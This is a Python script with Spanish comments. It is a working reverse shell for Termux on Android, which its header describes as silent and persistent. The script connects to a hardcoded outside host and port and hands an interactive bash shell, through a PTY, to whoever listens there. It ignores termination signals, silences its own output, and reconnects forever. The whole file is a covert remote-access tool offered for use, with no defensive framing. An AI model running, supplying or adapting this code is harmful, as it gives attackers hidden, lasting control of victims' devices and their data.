#!/usr/bin/env python3
"""
REVERSE SHELL TERMUX - SILENCIOSO Y PERSISTENTE
"""

import socket
import subprocess
import os
import sys
import time
import signal
import pty
import select
import fcntl
import termios
import struct

# ===== CONFIGURACIÓN =====
HOST = "Astrazam-37147.portmap.host"
PORT = 37147
# =========================

def set_nonblocking(fd):
    """Configurar file descriptor como no bloqueante"""
    try:
        fl = fcntl.fcntl(fd, fcntl.F_GETFL)
        fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
    except:
        pass

def get_shell_path():
    """Obtener la ruta del shell para Termux"""
    if os.path.exists('/data/data/com.termux'):
        return "/data/data/com.termux/files/usr/bin/bash"
    return "/bin/bash"

def spawn_shell(sock):
    """Crear shell interactiva con PTY"""
    try:
        # Crear PTY maestro/esclavo
        master, slave = pty.openpty()
        
        # Configurar terminal
        attrs = termios.tcgetattr(slave)
        attrs[3] = attrs[3] & ~termios.ECHO  # Sin eco
        termios.tcsetattr(slave, termios.TCSANOW, attrs)
        
        # Obtener shell
        shell = get_shell_path()
        shell_cmd = [shell, "-i"]
        
        # Fork para ejecutar shell
        pid = os.fork()
        
        if pid == 0:  # Proceso hijo
            # Cerrar el maestro
            os.close(master)
            
            # Hacer el esclavo nuestro terminal controlador
            os.dup2(slave, 0)
            os.dup2(slave, 1)
            os.dup2(slave, 2)
            
            # Configurar grupo de procesos
            os.setsid()
            os.tcsetpgrp(slave, os.getpgid(0))
            
            # Variables de entorno para terminal
            os.environ['TERM'] = 'xterm-256color'
            os.environ['COLORTERM'] = 'truecolor'
            
            # Ejecutar shell
            os.execvp(shell, shell_cmd)
            
        else:  # Proceso padre
            os.close(slave)
            
            # Configurar no bloqueante
            set_nonblocking(master)
            set_nonblocking(sock)
            
            # Bucle de transferencia de datos
            while True:
                try:
                    rlist, _, _ = select.select([master, sock], [], [], 1)
                    
                    for r in rlist:
                        if r == master:
                            data = os.read(master, 1024)
                            if data:
                                sock.sendall(data)
                        elif r == sock:
                            data = sock.recv(1024)
                            if data:
                                os.write(master, data)
                            else:
                                # Conexión cerrada
                                os.kill(pid, 9)
                                return False
                                
                except (OSError, socket.error):
                    continue
                except Exception:
                    break
                    
            return True
            
    except Exception:
        return False

def main():
    """Función principal con reconexión automática"""
    # Ignorar señales
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    signal.signal(signal.SIGHUP, signal.SIG_IGN)
    
    # Redirigir salidas a /dev/null para silencio
    devnull = open(os.devnull, 'w')
    sys.stdout = devnull
    sys.stderr = devnull
    
    print("[+] Reverse Shell iniciado (silencioso)")
    
    while True:
        try:
            # Crear socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(10)
            
            # Conectar
            sock.connect((HOST, PORT))
            sock.settimeout(None)
            
            # Lanzar shell interactiva
            spawn_shell(sock)
            
            # Si llegamos aquí, la shell terminó
            sock.close()
            time.sleep(3)
            
        except socket.timeout:
            time.sleep(5)
        except ConnectionRefusedError:
            time.sleep(10)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main()
